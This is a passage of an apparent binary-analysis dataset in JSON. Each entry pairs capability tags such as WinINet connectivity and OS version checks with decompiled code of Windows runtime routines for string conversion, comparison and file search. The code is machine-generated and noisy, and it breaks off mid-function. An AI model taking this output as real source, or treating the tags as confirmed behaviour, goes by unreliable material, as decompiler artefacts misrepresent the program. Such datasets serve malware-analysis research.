        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_bp_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid fcn.14001e894(char *arg1, uint16_t *arg2, uint64_t arg3, char *arg4)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint16_t *puVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uchar auStack184 [32];\n    char *pcStack152;\n    char *pcStack144;\n    ulong uStack136;\n    int32_t *piStack128;\n    int32_t aiStack120 [2];\n    uint16_t *puStack112;\n    ulong uStack104;\n    char acStack96 [8];\n    uint64_t uStack88;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_bp_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    \n    uStack88 = *0x14003e020 ^ auStack184;\n    uVar9 = 0;\n    aiStack120[0] = 0;\n    puStack112 = arg2;\n    if ((arg1 == NULL) || (arg3 != 0)) {\n        if (arg2 == NULL) {\n            arg4[0x30] = '\\x01';\n            *(arg4 + 0x2c) = 0x16;\n            pcStack152 = NULL;\n            pcStack144 = arg4;\n            fcn.14000bf58(0, 0, 0, 0);\n        }\n        else {\n            if (arg4[0x28] == '\\0') {\n                fcn.140010150(arg4);\n            }\n            iVar3 = *(arg4 + 0x18);\n            uVar5 = *(iVar3 + 0xc);\n            if (uVar5 == 0xfde9) {\n                uStack104 = 0;\n                pcStack152 = arg4;\n                fcn.1400267c0(arg1, &puStack112, arg3, &uStack104);\n            }\n            else {\n                if (arg1 == NULL) {\n                    if (*(iVar3 + 0x138) == 0) {\n                        uVar2 = *puStack112;\n                        puVar6 = puStack112;\n                        while (uVar2 != 0) {\n                            if (0xff < uVar2) goto code_r0x00014001e9a5;\n                            puVar6 = puVar6 + 1;\n                            uVar2 = *puVar6;\n                        }\n                        goto code_r0x00014001ebb6;\n                    }\n                    piStack128 = aiStack120;\n                    uStack136 = 0;\n                    pcStack144 = pcStack144 & 0xffffffff00000000;\n                    pcStack152 = NULL;\n                    iVar4 = fcn.14002026c(uVar5, 0, puStack112, 0xffffffff);\n                    if ((iVar4 != 0) && (aiStack120[0] == 0)) goto code_r0x00014001ebb6;\n                }\n                else {\n                    if (*(iVar3 + 0x138) == 0) {\n                        if (arg3 != 0) {\n                            do {\n                                if (0xff < *puStack112) goto code_r0x00014001e9a5;\n                                arg1[uVar9] = *puStack112;\n                                uVar2 = *puStack112;\n                                puStack112 = puStack112 + 1;\n                            } while ((uVar2 != 0) && (uVar9 = uVar9 + 1,  uVar9 < arg3));\n                        }\n                        goto code_r0x00014001ebb6;\n                    }\n                    pcStack152 = arg1;\n                    if (*(iVar3 + 8) == 1) {\n                        puVar6 = puStack112;\n                        uVar9 = arg3;\n                        if (arg3 != 0) {\n                            do {\n                                if (*puVar6 == 0) {\n                                    arg3 = (puVar6 - puStack112 >> 1) + 1;\n                                    break;\n                                }\n                                uVar9 = uVar9 - 1;\n                                puVar6 = puVar6 + 1;\n                            } while (uVar9 != 0);\n                        }\n                        piStack128 = aiStack120;\n                        uStack136 = 0;\n                        pcStack144 = pcStack144 & 0xffffffff00000000 | arg3 & 0xffffffff;\n                        iVar4 = fcn.14002026c(uVar5, 0, puStack112, arg3 & 0xffffffff);\n                        if ((iVar4 == 0) || (aiStack120[0] != 0)) {\ncode_r0x00014001e9a5:\n                            arg4[0x30] = '\\x01';\n                            *(arg4 + 0x2c) = 0x2a;\n                        }\n                        goto code_r0x00014001ebb6;\n                    }\n                    piStack128 = aiStack120;\n                    uStack136 = 0;\n                    pcStack144 = pcStack144 & 0xffffffff00000000 | arg3 & 0xffffffff;\n                    iVar4 = fcn.14002026c(uVar5, 0, puStack112, 0xffffffff);\n                    uVar10 = iVar4;\n                    if (aiStack120[0] == 0) {\n                        if (iVar4 != 0) goto code_r0x00014001ebb6;\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        if (iVar4 == 0x7a) {\n                            if (arg3 != 0) {\n                                do {\n                                    piStack128 = aiStack120;\n                                    uStack136 = 0;\n                                    uVar5 = *(*(arg4 + 0x18) + 8);\n                                    if (5 < uVar5) {\n                                        uVar5 = 5;\n                                    }\n                                    pcStack144 = pcStack144 & 0xffffffff00000000 | uVar5;\n                                    pcStack152 = acStack96;\n                                    iVar4 = fcn.14002026c(*(*(arg4 + 0x18) + 0xc), 0, puStack112, 1);\n                                    if ((((iVar4 == 0) || (aiStack120[0] != 0)) || (iVar4 < 0)) ||\n                                       (uVar8 = iVar4,  5 < uVar8)) goto code_r0x00014001eba8;\n                                    if (arg3 < uVar8 + uVar10) break;\n                                    uVar7 = uVar9;\n                                    if (0 < uVar8) {\n                                        do {\n                                            cVar1 = acStack96[uVar7];\n                                            arg1[uVar10] = cVar1;\n                                            if (cVar1 == '\\0') goto code_r0x00014001ebb6;\n                                            uVar7 = uVar7 + 1;\n                                            uVar10 = uVar10 + 1;\n                                        } while (uVar7 < uVar8);\n                                    }\n                                    puStack112 = puStack112 + 1;\n                                } while (uVar10 < arg3);\n                            }\n                            goto code_r0x00014001ebb6;\n                        }\n                    }\n                }\ncode_r0x00014001eba8:\n                *(arg4 + 0x2c) = 0x2a;\n                arg4[0x30] = '\\x01';\n            }\n        }\n    }\ncode_r0x00014001ebb6:\n    fcn.140005b20(uStack88 ^ auStack184);\n    return;\n}\n",
        "token_count": 1760
    },
    "14001ebd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.14001ebd4(ulong noname_0, ulong noname_1, ulong noname_2, ulong noname_3, ulong arg_30h, uint *arg_38h)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_bp_28h;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_30h._0_1_ = 0;\n    var_18h._0_1_ = '\\0';\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (arg_38h == NULL) {\n        uVar1 = *0x14003e3b8;\n        uVar3 = *0x14003e3bc;\n        uVar4 = *0x14003e3c0;\n        uVar5 = *0x14003e3c4;\n        if (*0x1400401e0 != 0) goto code_r0x00014001ec22;\n    }\n    else {\n        uVar1 = *arg_38h;\n        uVar3 = arg_38h[1];\n        uVar4 = arg_38h[2];\n        uVar5 = arg_38h[3];\n    }\n    var_18h._0_1_ = '\\x01';\n    _var_bp_28h = CONCAT412(uVar5, CONCAT48(uVar4, CONCAT44(uVar3, uVar1)));\ncode_r0x00014001ec22:\n    uVar1 = fcn.14001e774(noname_0, noname_1, noname_2, noname_3);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 602
    },
    "14002035": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.14002035c(uint16_t *arg1, uint16_t *arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    int64_t iStack56;\n    int64_t iStack48;\n    char cStack32;\n    \n    if (*0x1400401e0 != 0) {\n        if ((arg1 == NULL) || (arg2 == NULL)) {\n            puVar4 = fcn.140012c78();\n            *puVar4 = 0x16;\n            fcn.14000c028();\n            iVar3 = 0x7fffffff;\n        }\n        else {\n            fcn.140012c98(&stack0xffffffffffffffc8, 0);\n            iVar7 = iStack48;\n            if (*(iStack48 + 0x138) == 0) {\n                iVar3 = fcn.14002031c(arg1, arg2);\n            }\n            else {\n                do {\n                    uVar1 = *arg1;\n                    arg1 = arg1 + 1;\n                    if (uVar1 < 0x100) {\n                        uVar6 = uVar1;\n                        if ((*(\n                              L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                              + uVar6) & 1) != 0) {\n                            uVar6 = *(uVar6 + *(iVar7 + 0x110));\n                        }\n                        uVar1 = uVar6;\n                    }\n                    else {\n                        uVar1 = fcn.14002711c(uVar1, &stack0xffffffffffffffd0);\n                        iVar7 = iStack48;\n                    }\n                    uVar2 = *arg2;\n                    arg2 = arg2 + 1;\n                    if (uVar2 < 0x100) {\n                        uVar6 = uVar2;\n                        if ((*(\n                              L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                              + uVar6) & 1) != 0) {\n                            uVar6 = *(uVar6 + *(iVar7 + 0x110));\n                        }\n                        uVar2 = uVar6;\n                    }\n                    else {\n                        uVar2 = fcn.14002711c(uVar2, &stack0xffffffffffffffd0);\n                        iVar7 = iStack48;\n                    }\n                    iVar3 = uVar1 - uVar2;\n                } while ((iVar3 == 0) && (uVar1 != 0));\n            }\n            if (cStack32 != '\\0') {\n                *(iStack56 + 0x3a8) = *(iStack56 + 0x3a8) & 0xfffffffd;\n            }\n        }\n        return iVar3;\n    }\n    if ((arg1 != NULL) && (arg2 != NULL)) {\n        do {\n            uVar1 = *arg1;\n            arg1 = arg1 + 1;\n            uVar2 = *arg2;\n            arg2 = arg2 + 1;\n            uVar8 = uVar1 + 0x20;\n            if (0x19 < uVar1 - 0x41) {\n                uVar8 = uVar1;\n            }\n            uVar5 = uVar2 + 0x20;\n            if (0x19 < uVar2 - 0x41) {\n                uVar5 = uVar2;\n            }\n        } while ((uVar8 - uVar5 == 0) && (uVar8 != 0));\n        return uVar8 - uVar5;\n    }\n    iStack48 = 0x140020373;\n    puVar4 = fcn.140012c78();\n    *puVar4 = 0x16;\n    iStack48 = 0x14002037e;\n    fcn.14000c028();\n    return 0x7fffffff;\n}\n",
        "token_count": 1529
    },
    "140020c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpFindFileData\n// WARNING: Variable defined which should be unmapped: var_bp_28h\n// WARNING: Variable defined which should be unmapped: var_bp_30h\n\nvoid fcn.140020c08(char *arg1, char *arg2, int64_t *arg3)\n\n{\n    uint8_t uVar1;\n    char *lpMem;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    char *arg1_00;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint8_t uVar7;\n    ulong uVar8;\n    uint64_t arg3_00;\n    ulong var_ch;\n    ulong var_230h;\n    uchar auStack888 [32];\n    ulong uStack856;\n    uint uStack848;\n    uchar auStack840 [8];\n    uint64_t uStack832;\n    ulong uStack824;\n    ulong uStack816;\n    ulong uStack808;\n    ulong uStack800;\n    ulong uStack792;\n    char cStack784;\n    int64_t iStack776;\n    int64_t iStack768;\n    char cStack752;\n    int64_t iStack744;\n    int64_t iStack736;\n    char cStack720;\n    ulong uStack712;\n    ulong uStack704;\n    char *pcStack696;\n    ulong uStack688;\n    ulong uStack680;\n    char cStack672;\n    uchar auStack620 [492];\n    ulong var_bp_78h;\n    ulong var_bp_70h;\n    ulong var_bp_68h;\n    ulong var_bp_58h;\n    ulong var_bp_50h;\n    ulong var_bp_48h;\n    uint64_t var_bp_40h;\n    ulong var_bp_38h;\n    ulong var_bp_30h;\n    ulong var_bp_28h;\n    ulong lpFindFileData;\n    \n    var_bp_40h = *0x14003e020 ^ auStack888;\n    if (arg2 != arg1) {\n        do {\n            if ((*arg2 - 0x2fU < 0x2e) && ((0x200000000801U >> (*arg2 - 0x2fU & 0x3fU) & 1) != 0)) break;\n            arg2 = fcn.140027a98(arg1, arg2);\n        } while (arg2 != arg1);\n    }\n    if ((*arg2 == ':') && (arg2 != arg1 + 1)) {\n        fcn.140020a80(arg1, 0, 0, arg3);\n    }\n    else {\n        uVar7 = *arg2 - 0x2f;\n        uVar8 = 0;\n        if ((0x2d < uVar7) || (uVar1 = 1,  (0x200000000801U >> (uVar7 & 0x3fU) & 1) == 0)) {\n            uVar1 = 0;\n        }\n        uStack824 = 0;\n        uStack816 = 0;\n        uStack808 = 0;\n        uStack800 = 0;\n        uStack792 = 0;\n        arg3_00 = -uVar1 & arg2 + (1 - arg1);\n        cStack784 = '\\0';\n        uStack832 = arg3_00;\n        fcn.140012c98(&iStack776, 0);\n        if (*(iStack768 + 0xc) == 0xfde9) {\n            if (cStack752 != '\\0') {\n                *(iStack776 + 0x3a8) = *(iStack776 + 0x3a8) & 0xfffffffd;\n            }\n            uVar4 = 0xfde9;\n        }\n        else {\n            iVar2 = fcn.140019e50();\n            if (iVar2 == 0) {\n                if (cStack752 != '\\0') {\n                    *(iStack776 + 0x3a8) = *(iStack776 + 0x3a8) & 0xfffffffd;\n                }\n                uVar4 = 1;\n            }\n            else {\n                uVar4 = uVar8;\n                if (cStack752 != '\\0') {\n                    *(iStack776 + 0x3a8) = *(iStack776 + 0x3a8) & 0xfffffffd;\n                }\n            }\n        }\n        iVar2 = fcn.1400157e0(arg1, &uStack824, auStack840, uVar4);\n        uStack848 = 0;\n        uStack856 = 0;\n        uVar4 = uStack808;\n        if (iVar2 != 0) {\n            uVar4 = uVar8;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileExW)(uVar4);\n        if (iVar3 == -1) {\n            fcn.140020a80(arg1, 0, 0, arg3);\n            if (cStack784 != '\\0') {\n                fcn.140019b4c(uStack808);\n            }\n        }\n        else {\n            iVar6 = arg3[1] - *arg3 >> 3;\n            do {\n                uVar8 = 0;\n                uStack712 = 0;\n                uStack704 = 0;\n                pcStack696 = NULL;\n                uStack688 = 0;\n                uStack680 = 0;\n                cStack672 = '\\0';\n                fcn.140012c98(&iStack744, 0);\n                if (*(iStack736 + 0xc) == 0xfde9) {\n                    if (cStack720 != '\\0') {\n                        *(iStack744 + 0x3a8) = *(iStack744 + 0x3a8) & 0xfffffffd;\n                    }\n                    uVar8 = 0xfde9;\n                }\n                else {\n                    iVar2 = fcn.140019e50();\n                    if (iVar2 == 0) {\n                        if (cStack720 != '\\0') {\n                            *(iStack744 + 0x3a8) = *(iStack744 + 0x3a8) & 0xfffffffd;\n                        }\n                        uVar8 = 1;\n                    }\n                    else if (cStack720 != '\\0') {\n                        *(iStack744 + 0x3a8) = *(iStack744 + 0x3a8) & 0xfffffffd;\n                    }\n                }\n                iVar2 = fcn.1400206b0(auStack620, &uStack712, auStack840, uVar8);\n                lpMem = pcStack696;\n                arg1_00 = pcStack696;\n                if (iVar2 != 0) {\n                    arg1_00 = NULL;\n                }\n                if ((*arg1_00 == '.') && ((arg1_00[1] == '\\0' || ((arg1_00[1] == '.' && (arg1_00[2] == '\\0')))))) {\n                    if (cStack672 != '\\0') {\n                        fcn.140019b4c(pcStack696);\n                    }\n                }\n                else {\n                    iVar2 = fcn.140020a80(arg1_00, arg1, arg3_00, arg3);\n                    if (iVar2 != 0) {\n                        if (cStack672 != '\\0') {\n                            fcn.140019b4c(lpMem);\n                        }\n                        (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n                        if (cStack784 != '\\0') {\n                            fcn.140019b4c(uStack808);\n                        }\n                        goto code_r0x000140020f34;\n                    }\n                    arg3_00 = uStack832;\n                    if (cStack672 != '\\0') {\n                        fcn.140019b4c(lpMem);\n                        arg3_00 = uStack832;\n                    }\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3);\n            } while (iVar2 != 0);\n            iVar5 = arg3[1] - *arg3 >> 3;\n            if (iVar6 != iVar5) {\n                fcn.140027220(*arg3 + iVar6 * 8, iVar5 - iVar6, 8, 0x14002069c);\n            }\n            (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n            if (cStack784 != '\\0') {\n                fcn.140019b4c(uStack808);\n            }\n        }\n    }\ncode_r0x000140020f34:\n    fcn.140005b20(var_bp_40h ^ auStack888);\n    return;\n}\n",
        "token_count": 1913
    },
    "140020f5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.140020f58(int64_t *arg1, int64_t *arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong uStackX16;\n    int64_t iStackX24;\n    int64_t iStackX32;\n    ulong var_48h;\n    ulong var_50h;\n    ulong var_58h;\n    uchar auStack88 [16];\n    ulong uStack72;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    if (arg2 == NULL) {\n        puVar4 = fcn.140012c78();\n        *puVar4 = 0x16;\n        fcn.14000c028();\n        uVar8 = 0x16;\n    }\n    else {\n        *arg2 = 0;\n        iVar5 = *arg1;\n        auStack88 = ZEXT816(0);\n        uStack72 = 0;\n        while (iVar5 != 0) {\n            uStackX16 = CONCAT53(uStackX16._3_5_, 0x3f2a);\n            iVar5 = fcn.1400276d0(iVar5, &uStackX16);\n            if (iVar5 == 0) {\n                uVar2 = fcn.140020a80(*arg1, 0, 0, auStack88);\n                uVar8 = uVar2;\n                if (uVar2 != 0) {\n                    piVar7 = auStack88._0_8_;\n                    if (auStack88._0_8_ != auStack88._8_8_) {\n                        do {\n                            fcn.140019b4c(*piVar7);\n                            piVar7 = piVar7 + 1;\n                        } while (piVar7 != auStack88._8_8_);\n                    }\n                    goto code_r0x0001400209b3;\n                }\n            }\n            else {\n                uVar2 = fcn.140020c08(*arg1, iVar5, auStack88);\n                uVar8 = uVar2;\n                if (uVar2 != 0) {\n                    piVar7 = auStack88._0_8_;\n                    if (auStack88._0_8_ != auStack88._8_8_) {\n                        do {\n                            fcn.140019b4c(*piVar7);\n                            piVar7 = piVar7 + 1;\n                        } while (piVar7 != auStack88._8_8_);\n                    }\n                    goto code_r0x0001400209b3;\n                }\n            }\n            arg1 = arg1 + 1;\n            iVar5 = *arg1;\n        }\n        iVar5 = (auStack88._8_8_ - auStack88._0_8_ >> 3) + 1;\n        iStackX24 = 0;\n        for (piVar7 = auStack88._0_8_; piVar7 != auStack88._8_8_; piVar7 = piVar7 + 1) {\n            iVar6 = -1;\n            do {\n                iVar6 = iVar6 + 1;\n            } while (*(*piVar7 + iVar6) != '\\0');\n            iStackX24 = iStackX24 + 1 + iVar6;\n        }\n        iVar6 = fcn.1400161f4(iVar5, iStackX24);\n        if (iVar6 == 0) {\n            fcn.140019b4c(0);\n            for (piVar7 = auStack88._0_8_; piVar7 != auStack88._8_8_; piVar7 = piVar7 + 1) {\n                fcn.140019b4c(*piVar7);\n            }\n            uVar8 = 0xffffffff;\ncode_r0x0001400209b3:\n            fcn.140019b4c(auStack88._0_8_);\n        }\n        else {\n            iVar5 = iVar6 + iVar5 * 8;\n            iStackX32 = iVar5;\n            if (auStack88._0_8_ != auStack88._8_8_) {\n                uStackX16 = iVar6 - auStack88._0_8_;\n                piVar7 = auStack88._0_8_;\n                do {\n                    iVar9 = -1;\n                    do {\n                        iVar10 = iVar9;\n                        iVar9 = iVar10 + 1;\n                    } while (*(*piVar7 + iVar9) != '\\0');\n                    iVar10 = iVar10 + 2;\n                    iVar3 = fcn.140026914(iVar5, (iStackX32 - iVar5) + iStackX24, *piVar7, iVar10);\n                    if (iVar3 != 0) {\n                        fcn.14000c078(0, 0, 0, 0, 0);\n                        pcVar1 = swi(3);\n                        uVar8 = (*pcVar1)();\n                        return uVar8;\n                    }\n                    *(uStackX16 + piVar7) = iVar5;\n                    iVar5 = iVar5 + iVar10;\n                    piVar7 = piVar7 + 1;\n                } while (piVar7 != auStack88._8_8_);\n            }\n            *arg2 = iVar6;\n            fcn.140019b4c(0);\n            for (piVar7 = auStack88._0_8_; piVar7 != auStack88._8_8_; piVar7 = piVar7 + 1) {\n                fcn.140019b4c(*piVar7);\n            }\n            fcn.140019b4c(auStack88._0_8_);\n            uVar8 = 0;\n        }\n    }\n    return uVar8;\n}\n",
        "token_count": 1375
    },
    "140020f6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140020f60(ulong hModule, ulong arg2, uint64_t arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong arg4;\n    ulong var_190h;\n    uchar auStack680 [32];\n    uchar auStack648 [8];\n    int64_t iStack640;\n    int64_t iStack632;\n    char cStack616;\n    ulong uStack608;\n    uint64_t uStack600;\n    ulong uStack592;\n    uint64_t uStack584;\n    ulong uStack576;\n    uchar uStack568;\n    uchar auStack552 [416];\n    ulong lpFilename;\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e020 ^ auStack680;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(hModule, auStack552, 0x105);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.140012bec(uVar2);\n    }\n    else {\n        uStack576 = 0;\n        uStack568 = 0;\n        uStack608 = arg2;\n        uStack600 = arg3 & 0xffffffff;\n        uStack592 = arg2;\n        uStack584 = arg3 & 0xffffffff;\n        fcn.140012c98(&iStack640, 0);\n        arg4 = 0xfde9;\n        if (*(iStack632 + 0xc) == 0xfde9) {\n            if (cStack616 != '\\0') {\n                *(iStack640 + 0x3a8) = *(iStack640 + 0x3a8) & 0xfffffffd;\n            }\n        }\n        else {\n            iVar1 = fcn.140019e50();\n            if (iVar1 == 0) {\n                if (cStack616 != '\\0') {\n                    *(iStack640 + 0x3a8) = *(iStack640 + 0x3a8) & 0xfffffffd;\n                }\n                arg4 = 1;\n            }\n            else {\n                if (cStack616 != '\\0') {\n                    *(iStack640 + 0x3a8) = *(iStack640 + 0x3a8) & 0xfffffffd;\n                }\n                arg4 = 0;\n            }\n        }\n        fcn.14001595c(auStack552, &uStack608, auStack648, arg4);\n    }\n    fcn.140005b20(uStack24 ^ auStack680);\n    return;\n}\n",
        "token_count": 573
    },
    "14002108": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140021084(ulong noname_0, uint32_t *arg2, int64_t **arg3, uint32_t *arg4)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    \n    fcn.140011ea4(*arg2);\n    puVar6 = *(**arg3 + 0x88) + 0x18;\n    if (*0x140040900 == NULL) {\ncode_r0x000140021137:\n        puVar6 = fcn.140012c78();\n        *puVar6 = 0x16;\n        fcn.14000c028();\n    }\n    else {\n        if (puVar6 == NULL) {\n            fcn.140008040(*0x140040900, 0, 0x101);\n            goto code_r0x000140021137;\n        }\n        iVar9 = 2;\n        puVar8 = *0x140040900;\n        do {\n            uVar3 = puVar6[1];\n            uVar4 = puVar6[2];\n            uVar5 = puVar6[3];\n            *puVar8 = *puVar6;\n            puVar8[1] = uVar3;\n            puVar8[2] = uVar4;\n            puVar8[3] = uVar5;\n            uVar3 = puVar6[5];\n            uVar4 = puVar6[6];\n            uVar5 = puVar6[7];\n            puVar8[4] = puVar6[4];\n            puVar8[5] = uVar3;\n            puVar8[6] = uVar4;\n            puVar8[7] = uVar5;\n            uVar3 = puVar6[9];\n            uVar4 = puVar6[10];\n            uVar5 = puVar6[0xb];\n            puVar8[8] = puVar6[8];\n            puVar8[9] = uVar3;\n            puVar8[10] = uVar4;\n            puVar8[0xb] = uVar5;\n            uVar3 = puVar6[0xd];\n            uVar4 = puVar6[0xe];\n            uVar5 = puVar6[0xf];\n            puVar8[0xc] = puVar6[0xc];\n            puVar8[0xd] = uVar3;\n            puVar8[0xe] = uVar4;\n            puVar8[0xf] = uVar5;\n            uVar3 = puVar6[0x11];\n            uVar4 = puVar6[0x12];\n            uVar5 = puVar6[0x13];\n            puVar8[0x10] = puVar6[0x10];\n            puVar8[0x11] = uVar3;\n            puVar8[0x12] = uVar4;\n            puVar8[0x13] = uVar5;\n            uVar3 = puVar6[0x15];\n            uVar4 = puVar6[0x16];\n            uVar5 = puVar6[0x17];\n            puVar8[0x14] = puVar6[0x14];\n            puVar8[0x15] = uVar3;\n            puVar8[0x16] = uVar4;\n            puVar8[0x17] = uVar5;\n            uVar3 = puVar6[0x19];\n            uVar4 = puVar6[0x1a];\n            uVar5 = puVar6[0x1b];\n            puVar8[0x18] = puVar6[0x18];\n            puVar8[0x19] = uVar3;\n            puVar8[0x1a] = uVar4;\n            puVar8[0x1b] = uVar5;\n            puVar7 = puVar8 + 0x20;\n            uVar3 = puVar6[0x1d];\n            uVar4 = puVar6[0x1e];\n            uVar5 = puVar6[0x1f];\n            puVar8[0x1c] = puVar6[0x1c];\n            puVar8[0x1d] = uVar3;\n            puVar8[0x1e] = uVar4;\n            puVar8[0x1f] = uVar5;\n            puVar6 = puVar6 + 